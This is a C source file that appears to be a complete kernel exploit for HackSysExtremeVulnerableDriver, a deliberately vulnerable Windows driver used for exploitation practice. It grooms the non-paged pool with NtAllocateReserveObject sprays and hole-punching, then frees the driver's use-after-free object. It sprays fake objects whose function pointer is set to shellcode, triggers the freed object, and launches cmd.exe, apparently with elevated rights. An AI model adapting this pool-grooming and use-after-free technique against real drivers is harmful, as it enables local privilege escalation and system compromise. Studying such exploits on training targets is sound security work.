#include<stdio.h>
#include<Windows.h>

#include "x86-header.h"

# pragma warning(disable:6011)
# pragma warning(disable:6385)

typedef void(*ptr) ();

typedef struct _FAKE_USE_AFTER_FREE
{
	ptr p;
	char buffer[0x54];
}FAKE_USE_AFTER_FREE, * PUSE_AFTER_FREE;

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)

HANDLE A[0x4000];
HANDLE B[0x2000];

int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	puts("[+] Prepare work");
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	if (hModule == 0)
	{
		puts("Failed to load ntdll.dll");
		return 0;
	}

	NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hModule, "NtAllocateReserveObject");
	if (NtAllocateReserveObject == 0)
	{
		puts("Failed to resolve NtAllocateReserveObject");
		return 0;
	}

	puts("[+] Preparing Pool Memory");
	for (int i = 0; i < 0x4000; i++)
	{
		NTStatus = NtAllocateReserveObject(&A[i], 0, IO_COMPLETION_OBJECT);
		if (NTStatus != 0)
		{
			puts("Failed to call function NtAllocateReserveObject");
			return 0;
		}
	}

	for (int i = 0; i < 0x2000; i++)
	{
		NTStatus = NtAllocateReserveObject(&B[i], 0, IO_COMPLETION_OBJECT);
		if (NTStatus != 0)
		{
			puts("Failed to call function NtAllocateReserveObject");
			return 0;
		}
	}

	for (int i = 0; i < 0x2000; i+=2)
	{
		if (CloseHandle(B[i]) == 0)
		{
			puts("Failed to call close reserve object handle");
			return 0;
		}
	}

	puts("[+] Construct UAF");
	DeviceIoControl(hDevice, HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &recvbuf, NULL);

	DeviceIoControl(hDevice, HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, NULL, 0, NULL, 0, &recvbuf, NULL);

	PUSE_AFTER_FREE UAF = (PUSE_AFTER_FREE)malloc(sizeof(FAKE_USE_AFTER_FREE));
	UAF->p = ShellCode;
	memset(UAF->buffer, 0, sizeof(UAF->buffer));

	puts("[+] Heap Spray");
	for (int i = 0; i < 0x2000; i++)
	{
		DeviceIoControl(hDevice, HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL, UAF, 0x60, NULL, 0, &recvbuf, NULL);
	}

	puts("[+] Trigger UAF");
	DeviceIoControl(hDevice, HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, NULL, NULL, NULL, 0, &recvbuf, NULL);

	puts("[+] cmd.exe...");
	CreateCmd();

	return 0;
}